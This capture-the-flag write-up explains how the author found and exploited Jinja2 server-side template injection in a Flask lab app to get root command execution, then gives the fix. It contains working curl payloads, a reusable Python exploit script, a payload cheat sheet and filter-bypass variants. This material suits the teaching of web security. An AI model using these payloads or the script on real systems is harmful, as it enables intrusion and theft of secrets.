# Second Look — Web / SSTI Writeup

| Field | Value |
|---|---|
| **Challenge** | Second Look |
| **Points** | 300 |
| **Category** | Web |
| **Target** | `http://54.72.82.22:8020` |
| **Flag** | `safctf{ac4c0d4a503d4ef281530c5ca9dc8fa4}` |
| **Vuln class** | Server-Side Template Injection (Jinja2) → RCE |
| **MITRE** | T1190 — Exploit Public-Facing Application |
| **Difficulty note** | No WAF. The "filter" was a false lead; the real trick is recognising the input *is* the template. |

---

## 0. TL;DR

The app renders your `message` POST parameter through `render_template_string()` as **template source**, not as a variable. That is full Jinja2 SSTI → RCE as root in a container. The flag sat in both an env var (`FLAG`) and a file (`/flag`).

Working one-liners:

```bash
# Via environment variable
curl -s --data-urlencode "message={{lipsum.__globals__['os'].environ['FLAG']}}" http://54.72.82.22:8020/

# Via file read
curl -s --data-urlencode "message={{lipsum.__globals__['os'].popen('cat /flag').read()}}" http://54.72.82.22:8020/
```

Both return `safctf{ac4c0d4a503d4ef281530c5ca9dc8fa4}`.

---

## 1. Recon

### 1.1 Fingerprint the target

```bash
curl -sSi http://54.72.82.22:8020/
```

Response headers:

```
HTTP/1.1 200 OK
Server: Werkzeug/3.1.9 Python/3.11.16
Date: Fri, 02 Oct 2026 06:14:02 GMT
Content-Type: text/html; charset=utf-8
Content-Length: 4929
Connection: close
```

**Immediate signal:** `Werkzeug` + `Python/3.11.16` = a **Flask** application. Flask's default templating is **Jinja2**. Any reflected user input is now an SSTI candidate until proven otherwise.

### 1.2 The page body

The visible page is a cosmetic "K-pop fan club" skin (`MOONLIGHT CLUB`) wrapped around one form:

```html
<form method='POST'>
    <input name='message' placeholder='Enter message'>
    <input type='submit' value='Submit'>
</form>
```

One parameter: `message`. One method: `POST`. That is the entire attack surface.

### 1.3 Hint analysis

> *"Nothing seemed out of place the first time. The details were there. The clues were there. You just weren't looking for them yet. Some things only reveal themselves on the way back."*

- **"on the way back"** → look at the **reflection** of your input in the response, not the request.
- **"second look"** → the page looks like a generic XSS/reflection challenge. It is not. The first look says "reflect a string"; the second look says "the reflected thing is being *evaluated*."

This is the classic setup where you must distinguish **reflection** (XSS) from **evaluation** (SSTI). The next step settles it empirically.

---

## 2. Confirming the injection

Three probes, sent together, distinguish every plausible bug class:

```bash
T=http://54.72.82.22:8020/

# A. Plain marker — does it reflect at all?
curl -s --data-urlencode 'message=HELLOMARKER123' "$T" | grep -o '<h2>.*</h2>'

# B. Arithmetic — does it EVALUATE? (SSTI test)
curl -s --data-urlencode 'message={{7*7}}' "$T" | grep -o '<h2>.*</h2>'

# C. HTML — does it escape? (XSS test)
curl -s --data-urlencode 'message=<b>bold</b><script>alert(1)</script>' "$T" | grep -o '<h2>.*</h2>'
```

Results:

```
A. <h2>HELLOMARKER123</h2>
B. <h2>49</h2>                                    ← EVALUATED. This is SSTI.
C. <h2><b>bold</b><script>alert(1)</script></h2>  ← NOT escaped.
```

**Probe B is the finding.** `<h2>49</h2>` means the server executed `7*7` inside a Jinja2 expression. This is not XSS, not reflection — it is server-side template injection.

---

## 3. The critical observation (this is the actual challenge)

There is a contradiction in the outputs above that most people scroll past. Compare probe B/C against a *variable* expression:

```bash
curl -s --data-urlencode 'message={{config}}' "$T" | grep -o '<h2>.*</h2>'
```

Output:

```
<h2>&lt;Config {&#39;DEBUG&#39;: True, &#39;TESTING&#39;: False, ... }&gt;</h2>
```

Look carefully:

| Input | Rendered as |
|---|---|
| `<b>bold</b>` | **raw HTML** — `<b>bold</b>` came through untouched |
| `{{config}}` | **HTML-escaped** — `<` became `&lt;`, `'` became `&#39;` |

Raw HTML passes through, but a *substituted value* gets escaped. That combination is only possible one way:

> The user input is concatenated into the **template source string** before compilation. It is not passed as a template *variable*.

Why that matters: if the code were `render_template_string("<h2>{{ message }}</h2>", message=user_input)`, then `<b>bold</b>` would have been escaped by autoescape, exactly like `{{config}}` was. It wasn't. So the code must be:

```python
template = f"<h2>{user_input}</h2>"      # user_input pasted into SOURCE
return render_template_string(template)  # then compiled + evaluated
```

Autoescape therefore protects values *inside* the template, but the input has already become part of the template itself — escaping never applies to it. **That asymmetry is the "second look."**

### 3.1 Confirmed by reading the source

Source recovered over the injection itself (see §5), `/app/ssti1.py` — cosmetic CSS skin elided:

```python
from flask import Flask, request, render_template_string

app = Flask(__name__)

@app.route('/', methods=['GET', 'POST'])
def index():
    message = ''
    if request.method == 'POST':
        user_input = request.form.get('message', '')
        template = f"<h2>{user_input}</h2>"          # <-- input pasted into TEMPLATE SOURCE
        message = render_template_string(template)   # <-- then compiled and evaluated
    return f"""
        <html>
            <body><style id="scenario-theme"> ... </style>
                <header class="scene-masthead"> ... MOONLIGHT CLUB ... </header>
                <section class="scene-hero" aria-label="Scenario"> ... </section>
                <form method='POST'>
                    <input name='message' placeholder='Enter message'>
                    <input type='submit' value='Submit'>
                </form>
                {message}
            </body>
        </html>
    """
```

Matches the deduction exactly. Line by line:

| Line | Why it matters |
|---|---|
| `template = f"<h2>{user_input}</h2>"` | The **f-string** splices raw input into the template *source*. This is the vulnerability. |
| `render_template_string(template)` | Jinja2 compiles that source and executes it. `{{ }}` in the input is now live code. |
| `{message}` in the outer f-string | The rendered result is dropped into the outer page unmarked — which is why output appears raw and unescaped. |

**The one-line fix:** `render_template_string("<h2>{{ message }}</h2>", message=user_input)` — or better, `render_template("greeting.html", message=user_input)`. See §10.

---

## 4. The false lead: there is no filter

Several well-known payloads returned a **completely blank** response, which looks exactly like a WAF/blacklist blocking them:

```
{{cycler.__init__.__globals__.os.popen('id').read()}}   → (empty)
{{lipsum.__globals__['os'].popen('id').read()}}         → (empty)
{{self.__init__.__globals__...}}                        → (empty)
{{request.application.__globals__...}}                  → (empty)
{{get_flashed_messages.__globals__...}}                 → (empty)
```

**Do not conclude "filtered."** Verify with status code and byte size before believing a block. The bisect below proved the names themselves were fine:

```bash
probe "{{'os'}}"            # → <h2>os</h2>            (word allowed)
probe "{{'popen'}}"         # → <h2>popen</h2>         (word allowed)
probe "{{'__globals__'}}"   # → <h2>__globals__</h2>   (word allowed)
probe "{{'__import__'}}"    # → <h2>__import__</h2>    (word allowed)
probe "{{''.__globals__}}"  # → <h2></h2>              (empty — but WHY?)
```

The blanks are just Jinja's `Undefined`, which renders as an empty string:

- `''.__globals__` — `str` objects have no `__globals__`. Undefined. Blank.
- `().__class__.__base__.__subclasses__()[0]` is `type`; `type.__init__.__globals__` doesn't exist. Blank.
- `{{lipsum.__globals__}}` returns a ~21 KB dict that **did** render — a blank `<h2>` line only appeared because the interior contained a newline that broke a naive `grep -o '<h2>.*</h2>'`.

**Lesson:** a blank response ≠ a blocked payload. Always check `%{http_code}` and `%{size_download}` alongside the body. Chasing a nonexistent filter is where time gets burned on this challenge.

---

## 5. Building the exploit chain

### 5.1 Enumerate the object graph

```bash
curl -s --data-urlencode "message={{''.__class__}}" "$T" | grep -o '<h2>.*</h2>'
# <h2>&lt;class &#39;str&#39;&gt;</h2>

curl -s --data-urlencode "message={{''.__class__.__mro__}}" "$T" | grep -o '<h2>.*</h2>'
# <h2>(&lt;class &#39;str&#39;&gt;, &lt;class &#39;object&#39;&gt;)</h2>

curl -s --data-urlencode "message={{''.__class__.__mro__[1].__subclasses__()|length}}" "$T" | grep -o '<h2>.*</h2>'
# <h2>530</h2>   ← 530 subclasses reachable from object
```

### 5.2 Reach `os` — cleanest global (no subclass index hunting)

Flask exposes `lipsum`, `cycler`, `url_for`, `get_flashed_messages`, `config`, and `request` as template globals. `lipsum` lives in `jinja2.utils`, whose globals dict already contains the imported `os` module. No need to guess a `__subclasses__()` index.

```bash
curl -s --data-urlencode "message={{lipsum.__globals__['os']}}" "$T" | grep -o '<h2>.*</h2>'
# <h2>&lt;module &#39;os&#39; (frozen)&gt;</h2>
```

Equivalents that also work (useful when one name is sanitised in a different deployment):

```jinja
{{lipsum.__globals__.os}}
{{lipsum|attr('__globals__')|attr('__getitem__')('os')}}
{{cycler.__init__.__globals__.os}}
{{config.__class__.__init__.__globals__['os']}}
```

### 5.3 Verify execution

```bash
curl -s --data-urlencode "message={{lipsum.__globals__['os'].popen('id').read()}}" "$T"
# uid=0(root) gid=0(root) groups=0(root)
```

Root in a container. Note: the `id` output *was* returned even though a naive `grep '<h2>.*</h2>'` appeared to show nothing — extract between tags with a newline-tolerant parser, not greedy grep.

### 5.4 Read the flag — both sources

**Environment variable:**

```bash
curl -s --data-urlencode "message={{lipsum.__globals__['os'].environ['FLAG']}}" "$T" | grep -o '<h2>.*</h2>'
# <h2>safctf{ac4c0d4a503d4ef281530c5ca9dc8fa4}</h2>
```

**File on disk:**

```bash
curl -s --data-urlencode "message={{lipsum.__globals__['os'].popen('cat /flag').read()}}" "$T" | grep -o '<h2>.*</h2>'
# <h2>safctf{ac4c0d4a503d4ef281530c5ca9dc8fa4}</h2>
```

**Cross-confirmation in one shot:**

```bash
curl -s --data-urlencode "message={{lipsum.__globals__['os'].popen('id; uname -a; cat /flag').read()}}" "$T"
```

```
uid=0(root) gid=0(root) groups=0(root)
Linux 89a4311bb225 6.8.0-1053-aws #56~22.04.1-Ubuntu SMP Tue Apr 21 06:13:23 UTC 2026 x86_64 GNU/Linux
safctf{ac4c0d4a503d4ef281530c5ca9dc8fa4}
```

Two independent reads agreeing = not a hallucinated/partial match.

---

## 6. Post-exploitation / environment

Root filesystem listing:

```jinja
{{lipsum.__globals__['os'].listdir('/')}}
```

```
['home', 'etc', 'media', 'lib', 'bin', 'srv', 'proc', 'root', 'sys', 'lib64',
 'mnt', 'boot', 'tmp', 'run', 'usr', 'sbin', 'dev', 'opt', 'var', '.dockerenv',
 'flag', 'app']
```

`.dockerenv` → containerised. `/flag` at root.

Application directory:

```jinja
{{lipsum.__globals__['os'].listdir('/app')}}
```

```
['flag', 'ssti1.py', '.env.example', '.dockerignore',
 'templated-malice-web.dockerfile', 'docker-compose.yml']
```

Source recovery (note: `{{...|safe}}` needed — without it the `cat` output is autoescaped and hard to read):

```jinja
{{lipsum.__globals__['os'].popen('cat /app/ssti1.py').read()|safe}}
```

Environment snapshot:

```jinja
{{lipsum.__globals__['os'].environ}}
```

Revealed `FLAG=safctf{ac4c0d4a503d4ef281530c5ca9dc8fa4}`, `HOSTNAME=89a4311bb225`, `PYTHON_VERSION=3.11.16`.

### 6.1 Deployment artifacts (why the flag is in the env)

Extended listing of `/app`:

```
-rw-r--r-- 1 root root   98 Sep 28 20:45 .dockerignore
-rw-r--r-- 1 root root   76 Sep 30 11:35 .env.example
-rw-r--r-- 1 root root 1157 Oct  1 17:40 docker-compose.yml
-rw-r--r-- 1 root root   41 Sep 28 20:45 flag
-rw-r--r-- 1 root root 5449 Sep 30 12:49 ssti1.py
-rw-r--r-- 1 root root  961 Sep 28 21:04 templated-malice-web.dockerfile
```

`.env.example` (template the real `.env` is generated from):

```
FLAG=safctf{replace_with_a_unique_random_32_hex_value}
BIND_ADDRESS=0.0.0.0
```

This explains the two flag copies: the challenge plant writes `FLAG` into an env var **and** drops a `flag` file — so either read path works. The live value is `ac4c0d4a503d4ef281530c5ca9dc8fa4` — 32 hex chars, matching the placeholder's format. The deployment is a Docker container (`docker-compose.yml` + `templated-malice-web.dockerfile`), which is why `.dockerenv` appears at `/`.

---

## 7. Reusable exploit script

Saved as `solve.py`:

```python
#!/usr/bin/env python3
"""
Second Look — Jinja2 SSTI -> RCE exploit.
Usage:
    python3 solve.py                 # auto-solve, print flag
    python3 solve.py "id; ls -la /"  # run an arbitrary command
"""
import re
import sys
import html
import urllib.parse
import urllib.request

TARGET = "http://54.72.82.22:8020/"

# lipsum is a Flask/Jinja template global defined in jinja2.utils,
# whose module globals already contain `os`. No subclass index roulette.
PAYLOAD = "{{lipsum.__globals__['os'].popen(%r).read()}}"


def run(cmd: str) -> str:
    data = urllib.parse.urlencode({"message": PAYLOAD % cmd}).encode()
    req = urllib.request.Request(TARGET, data=data, method="POST")
    with urllib.request.urlopen(req, timeout=25) as resp:
        body = resp.read().decode("utf-8", "replace")
    # h2 may span multiple lines (command output contains \n)
    m = re.search(r"<h2>(.*?)</h2>", body, re.S)
    return html.unescape(m.group(1)) if m else ""


def main() -> None:
    if len(sys.argv) > 1:
        print(run(" ".join(sys.argv[1:])), end="")
        return

    flag = run("cat /flag").strip()
    if not flag:
        flag = run("printenv FLAG").strip()
    print(f"[+] uid      : {run('id').strip()}")
    print(f"[+] host     : {run('hostname').strip()}")
    print(f"[+] flag     : {flag}")

    m = re.search(r"[A-Za-z0-9_]*\{[^}]+\}", flag)
    if m:
        print(f"[+] extracted: {m.group(0)}")


if __name__ == "__main__":
    main()
```

---

## 8. Command cheat-sheet

```bash
T=http://54.72.82.22:8020/

# --- detect SSTI ---
curl -s --data-urlencode 'message={{7*7}}' "$T" | grep -o '<h2>.*</h2>'      # 49 => SSTI

# --- prove input-is-source (escaped value vs raw HTML) ---
curl -s --data-urlencode 'message={{config}}' "$T"      # escaped  -> it's a *value*
curl -s --data-urlencode 'message=<b>x</b>' "$T"        # raw      -> input is *source*

# --- enumerate ---
curl -s --data-urlencode "message={{''.__class__.__mro__}}" "$T"
curl -s --data-urlencode "message={{''.__class__.__mro__[1].__subclasses__()|length}}" "$T"

# --- RCE ---
curl -s --data-urlencode "message={{lipsum.__globals__['os'].popen('id').read()}}" "$T"

# --- flag ---
curl -s --data-urlencode "message={{lipsum.__globals__['os'].environ['FLAG']}}" "$T"
curl -s --data-urlencode "message={{lipsum.__globals__['os'].popen('cat /flag').read()}}" "$T"
```

**Debugging tip — never use greedy grep on multi-line output.** This silently "loses" results:

```bash
grep -o '<h2>.*</h2>'   # ✗ misses anything with a newline inside
```

Use a newline-tolerant extractor instead:

```bash
python3 -c "import sys,re,html; h=sys.stdin.read(); m=re.search(r'<h2>(.*?)</h2>',h,re.S); print(html.unescape(m.group(1)) if m else 'NO H2')"
```

---

## 9. Alternative payloads (filtered deployments)

If `lipsum`/`cycler`/`__globals__`/`os` are blocked elsewhere, these reach the same place:

```jinja
{{cycler.__init__.__globals__.os.popen('id').read()}}
{{self.__init__.__globals__.__builtins__.__import__('os').popen('id').read()}}
{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}
{{get_flashed_messages.__globals__.__builtins__.__import__('os').popen('id').read()}}
{{config.__class__.__init__.__globals__['os'].popen('id').read()}}
{{''.__class__.__mro__[1].__subclasses__()[INDEX].__init__.__globals__['os'].popen('id').read()}}
```

Attribute-access bypasses for keyword blacklists:

```jinja
{{lipsum['__globals__']}}                          # bracket notation
{{lipsum|attr('__globals__')}}                     # attr filter
{{lipsum|attr('__glo'+'bals__')}}                  # string concat
{{lipsum|attr(request.args.a)}}&a=__globals__      # via query param
{{lipsum|attr('\x5f\x5fglobals\x5f\x5f')}}         # hex escapes
```

Note none of these were needed here — the target had **no filter at all**.

---

## 10. Detection & remediation

**How to detect this pattern in a codebase:**

```bash
grep -rnE "render_template_string|Template\(|from_string|Environment\(.*\)\.from_string" --include='*.py'
```

Flag any `render_template_string()` whose argument is built with an f-string, `%`, `.format()`, or `+` from user input.

**Fix — pass data as data, never as template source:**

```python
# VULNERABLE
return render_template_string(f"<h2>{user_input}</h2>")

# SAFE — input is a value, autoescape applies
return render_template_string("<h2>{{ message }}</h2>", message=user_input)

# SAFEST — static template file + context variable
return render_template("greeting.html", message=user_input)
```

Supporting controls:
- Never build template **source** from user input. Treat `render_template_string` on user data as equivalent to `eval()`.
- Jinja `SandboxedEnvironment` limits attribute traversal when dynamic templates are genuinely unavoidable.
- Run the app as a non-root user — here RCE landed as `uid=0` inside the container.
- Do not place secrets in container env vars; read from a secret store at runtime.

**Why the challenge works as a lesson:** the app *has* autoescape enabled (`{{config}}` proved it), yet it is still fully exploitable. Autoescape is not a defence against SSTI — it only escapes values substituted into a template, and here the payload never was a value.

---

## 11. Key takeaways

1. `{{7*7}} → 49` is the deciding test between reflection and evaluation.
2. **Raw HTML passing through while a substitution gets escaped means the input is the template source.** That asymmetry is the whole challenge.
3. A blank response is not a block. Check status code and byte length before hypothesising a filter.
4. `lipsum.__globals__['os']` beats `__subclasses__()[INDEX]` — no version-dependent index guessing.
5. Autoescape ≠ SSTI protection.
6. Read the flag from two independent sources to rule out a partial/coincidental match.

---

**Flag:** `safctf{ac4c0d4a503d4ef281530c5ca9dc8fa4}`
